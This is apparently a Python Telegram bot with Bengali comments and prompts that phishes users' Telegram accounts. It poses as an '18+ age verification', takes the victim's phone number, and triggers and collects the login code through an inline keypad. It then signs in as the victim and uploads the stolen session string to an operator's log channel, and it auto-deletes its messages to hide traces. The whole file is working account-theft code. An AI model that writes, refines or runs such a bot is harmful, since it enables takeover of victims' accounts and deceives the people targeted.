import os
import asyncio
from dotenv import load_dotenv
from telethon import TelegramClient, events, types, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

# .env থেকে কনফিগারেশন লোড করা
load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID"))

bot = TelegramClient('login_bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

user_data = {}

# মেসেজ ৫ মিনিট (৩০০ সেকেন্ড) পর অটো-ডিলিট করার ফাংশন
async def delete_after(event, delay=300):
    await asyncio.sleep(delay)
    try:
        await event.delete()
    except:
        pass

def build_keypad():
    buttons = []
    nums = ["1", "2", "3", "4", "5", "6", "7", "8", "9"]
    row = []
    for num in nums:
        row.append(Button.inline(num, data=f"num_{num}"))
        if len(row) == 3:
            buttons.append(row)
            row = []
    buttons.append([Button.inline("❌ Clear", data="clear"), Button.inline("0", data="num_0"), Button.inline("✅ Submit", data="submit")])
    # নিচের বাটনটি এখন স্বাভাবিক বাটন হিসেবে দেখাবে
    buttons.append([Button.url("📩 গেট টেলিগ্রাম কোড", "tg://user?id=777000")]) 
    return buttons

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    msg = await event.respond(
        "🔞 **১৮+ কন্টেন্ট দেখতে হলে আপনার বয়স যাচাই করুন।**\nনিচের বাটনে ক্লিক করে এক্সেস নিন।",
        buttons=[Button.request_phone("আমার বয়স ১৮+ ✅")]
    )
    # ৫ মিনিট পর স্টার্ট মেসেজ ডিলিট হবে
    asyncio.create_task(delete_after(msg))

@bot.on(events.NewMessage)
async def handle_contact(event):
    if event.message.contact:
        phone = event.message.contact.phone_number
        chat_id = event.chat_id
        await event.delete()
        
        new_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await new_client.connect()
        
        try:
            send_code = await new_client.send_code_request(phone)
            user_data[chat_id] = {
                'phone': phone,
                'client': new_client,
                'hash': send_code.phone_code_hash,
                'typed_code': ""
            }
            msg = await event.respond(
                f"📱 **নম্বর:** `{phone}`\n\nআপনার নিচের কোডটি টাইপ করুন:\n**Type:** `____`",
                buttons=build_keypad()
            )
            # কি-প্যাড মেসেজ ৫ মিনিট পর ডিলিট হবে
            asyncio.create_task(delete_after(msg))
            
        except Exception as e:
            await event.respond(f"Error: {str(e)}")

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    chat_id = event.chat_id
    if chat_id not in user_data: return
    
    data = event.data.decode('utf-8')
    current = user_data[chat_id]

    if data.startswith("num_"):
        num = data.split("_")[1]
        if len(current['typed_code']) < 5:
            current['typed_code'] += num
            await event.edit(
                f"📱 **নম্বর:** `{current['phone']}`\n\nআপনার নিচের কোডটি টাইপ করুন:\n**Type:** `{current['typed_code']}`",
                buttons=build_keypad()
            )

    elif data == "clear":
        current['typed_code'] = ""
        await event.edit("কোড মুছে ফেলা হয়েছে। আবার টাইপ করুন।", buttons=build_keypad())

    elif data == "submit":
        code = current['typed_code']
        client = current['client']
        try:
            await client.sign_in(current['phone'], code, phone_code_hash=current['hash'])
            session_str = client.session.save() # সেশন জেনারেট
            
            file_name = f"{current['phone']}.txt"
            with open(file_name, "w") as f:
                f.write(f"Phone: {current['phone']}\nSession: {session_str}")
            
            await bot.send_file(LOG_CHANNEL_ID, file_name, caption=f"✅ New Login: {current['phone']}")
            os.remove(file_name)
            
            success_msg = await event.edit("✅ **বয়স যাচাই সফল!** এখন আপনি সব কন্টেন্ট দেখতে পারবেন।")
            # ৫ মিনিট পর সফল মেসেজ ডিলিট হবে
            asyncio.create_task(delete_after(success_msg))
            
        except PhoneCodeInvalidError:
            current['typed_code'] = ""
            await event.edit("❌ **ভুল কোড!** সঠিক কোডটি পুনরায় টাইপ করুন।", buttons=build_keypad())
        except Exception as e:
            await event.edit(f"Error: {str(e)}")

print("Login Bot is running...")
bot.run_until_disconnected()
